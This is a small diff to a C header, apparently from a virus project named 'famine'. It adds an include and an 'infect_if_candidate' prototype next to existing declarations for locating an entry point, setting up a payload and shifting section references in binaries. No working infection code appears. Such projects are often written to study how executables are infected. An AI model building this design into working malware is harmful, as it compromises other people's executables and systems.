@@ -18,6 +18,7 @@
 # include <unistd.h>
 # include <sys/types.h>
 # include "famine.h"
+# include "accessors.h"
 
 # define SHIFT_ALIGNMENT	4096
 # define ALIGN(x, n)		(((x) + (n)) & ~((n) - 1))
@@ -61,6 +62,7 @@ bool	foreach_shdr(struct safe_pointer info, f_iter_callback callback, void *data
 ** infect
 */
 
+void		infect_if_candidate(const char *file);
 bool	find_entry(struct entry *original_entry, struct safe_pointer info);
 bool	setup_payload(const struct entry *original_entry);
 bool	adjust_references(size_t shift_amount, const struct entry *original_entry);
